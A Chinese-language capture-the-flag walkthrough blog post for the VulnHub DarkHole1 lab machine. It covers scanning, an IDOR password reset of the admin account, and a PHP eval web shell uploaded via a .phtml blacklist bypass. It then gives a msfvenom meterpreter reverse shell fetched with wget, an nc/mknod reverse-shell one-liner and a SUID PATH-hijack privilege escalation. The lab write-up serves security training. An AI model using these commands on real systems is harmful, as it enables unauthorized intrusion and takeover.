@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            vulnhub darkhole1 靶场通关
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="TPA HACK-NOTE" type="application/atom+xml">
+</head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">vulnhub darkhole1 靶场通关</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-11-24
+                        </span>
+                        
+                            
+                                <span id="/posts/452430507.html" class="leancloud_visitors" data-flag-title="vulnhub darkhole1 靶场通关">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                              
+                        
+                    </p>
+                    
+                        
+                            <span class="category-color">web</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">渗透测试</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="darkhole1"><a href="#darkhole1" class="headerlink" title="darkhole1"></a>darkhole1</h1><img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001200754027.png" alt="image-20221001200754027" style="zoom:50%;" />
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先拿到靶机ip 扫描c段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.3.1/24</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001200832838.png" alt="image-20221001200832838" style="zoom:50%;" />
+
+<p>扫出靶机为192.168.3.129</p>
+<p>端口扫描（进行全面扫描防止漏扫）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 -A 192.168.3.129</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001201256448.png" alt="image-20221001201256448" style="zoom:50%;" />
+
+<p>目标只开放了22&#x2F;80端口</p>
+<p>80端口识别出服务器为apache2.4.41(这个版本好像存在解析漏洞，后面可能用到)，不出意外是php的网页</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221001201618841.png" alt="image-20221001201618841"></p>
+<p>顺便看下页面源代码，没有找到有用信息</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001203935404.png" alt="image-20221001203935404" style="zoom:50%;" />
+
+<p>接下来对该网站进行目录搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://192.168.3.129/</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001202023659.png" alt="image-20221001202023659" style="zoom:50%;" />
+
+<p>等程序跑完查看报告</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># Dirsearch started Sat Oct  1 08:19:33 2022 as: dirsearch.py -u http://192.168.3.129/</span><br><span class="line"></span><br><span class="line">403   278B   http://192.168.3.129/.ht_wsr.txt</span><br><span class="line">403   278B   http://192.168.3.129/.htaccess.bak1</span><br><span class="line">301   311B   http://192.168.3.129/js    -&gt; REDIRECTS TO: http://192.168.3.129/js/</span><br><span class="line">403   278B   http://192.168.3.129/.htaccess.save</span><br><span class="line">403   278B   http://192.168.3.129/.htaccess.sample</span><br><span class="line">403   278B   http://192.168.3.129/.htaccess.orig</span><br><span class="line">403   278B   http://192.168.3.129/.htaccess_extra</span><br><span class="line">403   278B   http://192.168.3.129/.htaccess_sc</span><br><span class="line">403   278B   http://192.168.3.129/.htaccessOLD</span><br><span class="line">403   278B   http://192.168.3.129/.htaccessOLD2</span><br><span class="line">403   278B   http://192.168.3.129/.htaccess_orig</span><br><span class="line">403   278B   http://192.168.3.129/.htaccessBAK</span><br><span class="line">403   278B   http://192.168.3.129/.html</span><br><span class="line">403   278B   http://192.168.3.129/.htm</span><br><span class="line">403   278B   http://192.168.3.129/.htpasswd_test</span><br><span class="line">403   278B   http://192.168.3.129/.htpasswds</span><br><span class="line">403   278B   http://192.168.3.129/.httr-oauth</span><br><span class="line">403   278B   http://192.168.3.129/.php</span><br><span class="line">301   315B   http://192.168.3.129/config    -&gt; REDIRECTS TO: http://192.168.3.129/config/</span><br><span class="line">200   947B   http://192.168.3.129/config/</span><br><span class="line">301   312B   http://192.168.3.129/css    -&gt; REDIRECTS TO: http://192.168.3.129/css/</span><br><span class="line">200    21B   http://192.168.3.129/dashboard.php</span><br><span class="line">200     1KB  http://192.168.3.129/js/</span><br><span class="line">200     2KB  http://192.168.3.129/login.php</span><br><span class="line">302     0B   http://192.168.3.129/logout.php    -&gt; REDIRECTS TO: login.php</span><br><span class="line">200     3KB  http://192.168.3.129/register.php</span><br><span class="line">403   278B   http://192.168.3.129/server-status</span><br><span class="line">403   278B   http://192.168.3.129/server-status/</span><br><span class="line">301   315B   http://192.168.3.129/upload    -&gt; REDIRECTS TO: http://192.168.3.129/upload/</span><br><span class="line">200   932B   http://192.168.3.129/upload/</span><br></pre></td></tr></table></figure>
+
+<p>403状态码为禁止访问</p>
+<p>301状态码为永久移动</p>
+<p>302状态码为临时移动</p>
+<p>搜集200状态码可以成功访问的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.129/config/</span><br><span class="line">http://192.168.3.129/dashboard.php</span><br><span class="line">http://192.168.3.129/js/</span><br><span class="line">http://192.168.3.129/login.php</span><br><span class="line">http://192.168.3.129/register.php</span><br><span class="line">http://192.168.3.129/upload/</span><br></pre></td></tr></table></figure>
+
+<p>接下来看看一下这些页面（根据经验config目录可能存在信息泄露&#x2F;login与register登录注册页面可能存在逻辑漏洞&#x2F;upload可能存在文件上传getshell）接下来也会重点关注这几个问题</p>
+<p>首先看下config目录</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001203607743.png" alt="image-20221001203607743" style="zoom:50%;" />
+
+<p>发现database.php，点进去看不到白高兴了</p>
+<p>看下dashboard.php</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221001203831878.png" alt="image-20221001203831878"></p>
+<p>这个也进不去，英文字面意思为仪表板，猜测可能是后台之类的可能得登录才有权限访问</p>
+<p>看下js目录</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001204211920.png" alt="image-20221001204211920" style="zoom:50%;" />
+
+<p>两个js文件，先收集下来后面可能需要进行代码审计（大致看了下没啥用）</p>
+<p>dashboard.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">form_display_hour</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fallday&quot;</span>).<span class="property">checked</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fhourdiv&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fhourdiv&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;flex&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">form_init</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> today = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>();</span><br><span class="line">    <span class="keyword">const</span> date = today.<span class="title function_">split</span>(<span class="string">&quot;T&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fdate&quot;</span>).<span class="property">min</span> = date;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fstart&quot;</span>).<span class="property">step</span> = <span class="number">900</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fend&quot;</span>).<span class="property">step</span> = <span class="number">900</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">time_step_str</span>(<span class="params">date, step</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> minutes = date.<span class="title function_">getMinutes</span>() + step;</span><br><span class="line">    <span class="keyword">var</span> hours = date.<span class="title function_">getHours</span>() + <span class="title class_">Math</span>.<span class="title function_">floor</span>(minutes / <span class="number">60</span>);</span><br><span class="line">    minutes %= <span class="number">60</span>;</span><br><span class="line">    hour = <span class="title class_">String</span>(hours).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    minutes = <span class="title class_">String</span>(minutes).<span class="title function_">padStart</span>(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;hours&#125;</span>:<span class="subst">$&#123;minutes&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">form_validate_hour</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> start = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fstart&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> end = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;fend&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> startDate = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> endDate = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line">    startDate.<span class="title function_">setHours</span>(...start.<span class="property">value</span>.<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>).<span class="title function_">map</span>(<span class="title class_">Number</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (end.<span class="property">value</span> === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        end.<span class="property">value</span> = <span class="title function_">time_step_str</span>(startDate, <span class="title class_">Number</span>(end.<span class="property">step</span>) / <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    endDate.<span class="title function_">setHours</span>(...end.<span class="property">value</span>.<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>).<span class="title function_">map</span>(<span class="title class_">Number</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (startDate &gt; endDate) &#123;</span><br><span class="line">        end.<span class="property">value</span> = <span class="title function_">time_step_str</span>(startDate, <span class="title class_">Number</span>(end.<span class="property">step</span>) / <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">form_init</span>();</span><br></pre></td></tr></table></figure>
+
+<p>home.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onscroll</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="title function_">myFunction</span>()&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> header = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;nav-bar&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> sticky = header.<span class="property">offsetTop</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">pageYOffset</span> &gt; sticky) &#123;</span><br><span class="line">        header.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&quot;sticky&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&quot;sticky&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来看下login.php</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001204526551.png" alt="image-20221001204526551" style="zoom:50%;" />
+
+<p>不出意外是个登录页面，后面看看有没有漏洞</p>
+<p>然后同样是register.php注册页面</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001204631766.png" alt="image-20221001204631766" style="zoom:50%;" />
+
+
+
+<p>这两个页面都有可能存在sql注入，先不管</p>
+<p>接下来看下upload目录</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001204734410.png" alt="image-20221001204734410" style="zoom:50%;" />
+
+<p>有个图片，看样子在拍电影应该是某个外国明星。有可能图片里隐藏了密码，先收集下来防止被作者偷袭。</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001204940150.png" alt="image-20221001204940150" style="zoom:50%;" />
+
+
+
+<p>目前网站第一层的信息收集的差不多了，进入渗透阶段。</p>
+<h2 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h2><p>看样子是只能从登录&#x2F;注册页面开始下手了</p>
+<p>在登录页面拿我的字典弱口令爆破下，看能不能直接登上管理员的账号。（不出意外没跑下来）</p>
+<p>那就先注册吧，注册之前养成好习惯把bp启动，拦截到注册的请求包</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001210815464.png" alt="image-20221001210815464" style="zoom:50%;" />
+
+<p>发现第一个无限注册的漏洞（靶场没卵用），后端只校验用户名&#x2F;邮箱&#x2F;在数据库重没重复，并没有验证码进行注册限制。</p>
+<p>接下来用注册好的账号登录，在拦截登录第二个包发现个熟悉的身影adshboard.php并且携带id</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221001211307844.png" alt="image-20221001211307844"></p>
+<p>因为我注册了两个号，admin123和admin1234，admin1234的id为3那么管理员的id可能为1，修改id&#x3D;1试试能不能越权访问</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221001211543813.png" alt="image-20221001211543813"></p>
+<p>可以的，给我拦截了，再看看有没有sql注入，靶场懒得手工注入了直接sqlmap跑一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.3.129/dashboard.php?id=3&quot; --batch</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001212123930.png" alt="image-20221001212123930" style="zoom:50%;" />
+
+<p>没跑下来，暂时忽略这个请求包，继续进行渗透</p>
+<p>登录不了别人的，老老实实登自己的账号吧，登录成功到了一个可以修改用户信息和密码的页面</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221001212300636.png" alt="image-20221001212300636"></p>
+<p>先试试修改Details信息，把用户名和邮箱admin1234改成了admin12345，试试把它改成其他存在用户admin123看看可不可以，改完没有效果，当修改id还是被拦截下来了</p>
+<p>那么希望全都寄托在修改password的身上了。修改密码发现这个请求包是post的请求，而之前的都是get请求。看看这个接口有没有越权漏洞，更改post请求参数为id&#x3D;1看看能不能更改管理员账号的密码</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001214116340.png" alt="image-20221001214116340" style="zoom:50%;" />
+
+
+
+<p>因为之前登录弱口令爆破时爆破admin时提示我用户重复了，说明这个用户是存在的，可能就是id&#x3D;1的用户</p>
+<p>尝试用新修改的admin密码登录admin账号，果然成功了</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001214712720.png" alt="image-20221001214712720" style="zoom:50%;" />
+
+<p>多了个upload模块，很明显了文件上传getshell，接下来就是怎么绕过限制或者黑名单</p>
+<p>先上传一句木马试试水</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[tpa]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221001215344192.png" alt="image-20221001215344192" style="zoom:50%;" />
+
+<p>做了上传格式的限制，通过测试找到了黑名单的漏网之鱼.phtml后缀并没有进行限制</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221001221223952.png" alt="image-20221001221223952"></p>
+<p>蚁剑连接成功 直接getshell</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221001221440776.png" alt="image-20221001221440776"></p>
+<h2 id="提权阶段"><a href="#提权阶段" class="headerlink" title="提权阶段"></a>提权阶段</h2><p>现在用户是www-data接下来要做的就是提权到root</p>
+<p>查看敏感文件找到存在可以提权的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002111538850.png" alt="image-20221002111538850"></p>
+<p>去john用户的家目录看看能不能找到有用的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002112859776.png" alt="image-20221002112859776"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1文件类型3文件拥有者权限3文件所属用户组权限3其他用户权限</span><br><span class="line"></span><br><span class="line">#文件权限符以 d 开头的代表是文件夹</span><br><span class="line"></span><br><span class="line">drwxrwxrwx</span><br><span class="line"></span><br><span class="line">#文件权限符以 - 开头的代表是文件（包括硬链接文件，硬链接文件相当于原文件的备份，可以与原文件做到同步更新）</span><br><span class="line"></span><br><span class="line">-rwxrwxrwx</span><br><span class="line"></span><br><span class="line">#文件权限符以 l 开头的代表是软链接文件，软链接文件相当于原文件的快捷方式</span><br><span class="line"></span><br><span class="line">lrwxrwxrwx</span><br><span class="line"></span><br><span class="line">#文件权限符以 c 开头的代表是字符设备文件，例：鼠标、键盘；</span><br><span class="line"></span><br><span class="line">crwxrwxrwx</span><br><span class="line"></span><br><span class="line">#文件权限符以 b 开头的代表是块设备文件，例：硬盘；</span><br><span class="line"></span><br><span class="line">brwxrwxrwx</span><br><span class="line"></span><br><span class="line">r读w写x执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法一：SUID提权"><a href="#方法一：SUID提权" class="headerlink" title="方法一：SUID提权"></a>方法一：SUID提权</h3><p>这toto命令具有SUID权限，运行一下</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002121215216.png" alt="image-20221002121215216"></p>
+<p>看一下角色变没变</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002121242211.png" alt="image-20221002121242211"></p>
+<p>是否能查看目录下文件（仍然没有）</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002121327346.png" alt="image-20221002121327346"></p>
+<p>这个toto看输出可能是单纯执行了id命令</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002121418821.png" alt="image-20221002121418821"></p>
+<p>更改环境变量，等执行.&#x2F;toto时会执行id，执行id时就会执行我们的&#x2F;bin&#x2F;bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/id</span><br><span class="line">chmod 777 /tmp/id</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./toto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002123724003.png" alt="image-20221002123724003"></p>
+<p>正常来讲应该是成功了，但这却失败了可能是蚁剑的原因，反弹到kali机上试试</p>
+<p><strong>方法1</strong></p>
+<p>生成php反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.3</span><span class="number">.128</span> lport=<span class="number">7777</span> -o msfshell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002124247427.png" alt="image-20221002124247427"></p>
+<p>开启http</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑终端下载msfshell.php</p>
+<p>还是先回到upload目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/upload</span><br></pre></td></tr></table></figure>
+
+<p>下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.3.128/msfshell.php</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221002125400686.png" alt="image-20221002125400686" style="zoom:50%;" />
+
+<p>kali开启监听端口7777</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">set lhost 192.168.3.128</span><br><span class="line">set lport 7777</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221002125906558.png" alt="image-20221002125906558" style="zoom:50%;" />
+
+<p>看看参数是不是都填完了</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221002130000899.png" alt="image-20221002130000899" style="zoom:50%;" />
+
+<p>确认后run开始监听</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002130050086.png" alt="image-20221002130050086"></p>
+<p>访问shell文件 触发监听</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.3.129/upload/msfshell.php">http://192.168.3.129/upload/msfshell.php</a></p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002130204877.png" alt="image-20221002130204877"></p>
+<p>成功拿到meterpreter</p>
+<p>进入交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002132018765.png" alt="image-20221002132018765"></p>
+<p><strong>方法2</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 供攻击机连接的端口号</span><br><span class="line">example: nc -lvvp 8888    -vv比-v更详细输出</span><br><span class="line"></span><br><span class="line">mknod 设备名称  p &amp;&amp; nc  kali 的ip   kali的端口  0&lt;设备名称 | /bin/bash 1&gt;设备名称</span><br><span class="line">example: mknod backdoor p &amp;&amp; nc 192.168.133.131 8888 0&lt;backdoor | /bin/bash 1&gt;backdoor 获取回显窗口</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到交互式shell后继续执行刚才的命令，成功进入到john账号</p>
+<img src="/image/article/vulnhub-darkhole1-靶场通关/image-20221002132616355.png" alt="image-20221002132616355" style="zoom:50%;" />
+
+
+
+<p>看看jogn目录下的文件</p>
+<p><img src="/image/article/vulnhub-darkhole1-%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/image-20221002132836226.png" alt="image-20221002132836226"></p>
+<p>只看到了password的john的密码root123还是个弱口令</p>
